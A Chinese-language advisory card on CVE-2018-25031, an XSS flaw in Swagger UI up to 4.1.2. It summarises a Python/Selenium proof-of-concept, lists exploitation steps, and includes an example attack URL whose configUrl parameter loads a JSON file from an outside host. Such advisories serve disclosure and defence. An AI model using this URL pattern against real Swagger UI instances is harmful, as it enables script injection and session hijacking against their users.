## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)